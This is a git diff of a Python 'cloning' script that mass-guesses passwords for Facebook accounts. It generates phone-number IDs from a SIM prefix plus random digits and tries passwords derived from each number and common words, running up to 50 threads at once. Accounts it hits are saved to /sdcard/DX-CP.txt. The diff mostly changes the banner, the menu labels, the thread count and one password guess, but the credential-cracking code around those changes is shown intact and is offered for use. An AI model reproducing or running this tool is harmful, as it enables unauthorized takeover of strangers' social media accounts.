@@ -66,12 +66,18 @@ def randBuildLSB():
 
 logo=(f'''{B}
 
-\033[1;33m╭━━━┳╮╱╭┳━━┳━━━╮
-\033[1;33m┃╭━╮┃┃╱┃┣┫┣┻╮╭╮┃
-\033[1;33m┃┃╱┃┃╰━╯┃┃┃╱┃┃┃┃
-\033[1;33m┃┃╱┃┃╭━╮┃┃┃╱┃┃┃┃
-\033[1;33m┃╰━╯┃┃╱┃┣┫┣┳╯╰╯┃
-\033[1;33m╰━━━┻╯╱╰┻━━┻━━━╯
+\033[1;32m─────────────────────────────────────────────────────────
+\033[1;32m─██████████████─██████──██████─██████████─████████████───
+\033[1;35m─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─
+\033[1;35m─██▒▒██████▒▒██─██▒▒██──██▒▒██─████▒▒████─██▒▒████▒▒▒▒██─
+\033[1;36m─██▒▒██──██▒▒██─██▒▒██──██▒▒██───██▒▒██───██▒▒██──██▒▒██─
+\033[1;36m─██▒▒██──██▒▒██─██▒▒██████▒▒██───██▒▒██───██▒▒██──██▒▒██─
+\033[1;33m─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██───██▒▒██───██▒▒██──██▒▒██─ 
+\033[1;33m─██▒▒██──██▒▒██─██▒▒██──██▒▒██───██▒▒██───██▒▒██──██▒▒██─
+\033[1;37m─██▒▒██████▒▒██─██▒▒██──██▒▒██─████▒▒████─██▒▒████▒▒▒▒██─
+\033[1;37m─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─
+\033[1;34m─██████████████─██████──██████─██████████─████████████───
+\033[1;34m─────────────────────────────────────────────────────────
                                                                                          
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
@@ -94,8 +100,8 @@ def clear():
 def TARA_LOVE():
     clear()
     os.system('xdg-open https://www.facebook.com/profile.php?id=100092954297396&mibextid=vPdvX0B5T65af74v')
-    print(f'{B} [{warna}01{B}] \33[0;41mRANDOM CLONING\033[0;92m ')
-    print(f'{B} [{warna}02{B}] \33[0;41mJOIN FB GROUP\033[0;92m ')
+    print(f'{B} [{warna}01{B}] \33[0;41mSTART CLONING\033[0;92m ')
+    print(f'{B} [{warna}02{B}] \33[0;41mFOLLOW MY FB\033[0;92m ')
     print(f'{B} [{warna}03{B}] CONTACT WHATSAPP')
     print(f'{B} [{warna}00{B}] EXIT PROGRAMING')
     linex()
@@ -124,7 +130,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with tred(max_workers=40) as Tara:
+    with tred(max_workers=50) as Tara:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -133,7 +139,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'728027','freefire','Bangladesh','iloveu']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','freefire','Bangladesh','iloveu']
             Tara.submit(method_crack,ids,passlist)
     linex()
     print(' THE PROGRESS HAS BEEN COMPLETE ')
@@ -148,7 +154,7 @@ def method_crack(ids,passlist):
     global loop
     try:
         for pas in passlist:
-            sys.stdout.write('\r\r \033[1;37m[FINDING] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
+            sys.stdout.write('\r\r \033[1;37m[SEARCH] %s|\033[1;32mCOMPLEATE:%s'%(loop,len(oks)))
             sys.stdout.flush()
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
@@ -171,7 +177,7 @@ def method_crack(ids,passlist):
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;35m[Ohid-CP] '+ids+' | '+pas+'\033[1;37m')
+                print('\r\r \033[1;35m[OHID-CP] '+ids+' | '+pas+'\033[1;37m')
                 open('/sdcard/DX-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
